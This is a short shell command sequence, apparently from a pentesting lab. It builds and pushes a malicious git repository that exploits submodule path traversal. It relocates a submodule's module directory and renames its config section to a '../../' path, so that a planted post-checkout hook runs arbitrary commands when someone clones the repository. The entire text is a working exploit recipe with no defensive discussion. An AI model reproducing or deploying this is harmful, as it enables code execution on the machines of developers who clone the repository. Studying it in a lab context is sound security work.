$ git clone malicious.git
$ cd malicious
$ mkdir -p fakegit/modules/
# https://github.com/pentesterlab/empty.git can be any empty repository
$ git submodule add https://github.com/pentesterlab/empty.git evil
$ git submodule add https://github.com/pentesterlab/empty.git aaa
$ mv .git/modules/evil fakegit/modules/evil
# Make sure your post-checkout script starts with !/bin/sh
$ vi fakegit/modules/evil/hooks/post-checkout
# Adding any command to be executed in post-checkout file
$ chmod 755 fakegit/modules/evil/hooks/post-checkout
$ git config -f .gitmodules --rename-section submodule.evil submodule.../../fakegit/modules/evil
$ sed -i 's/\.git/fakegit/' evil/.git
$ git add .
$ git commit -m "Initial import"
$ git push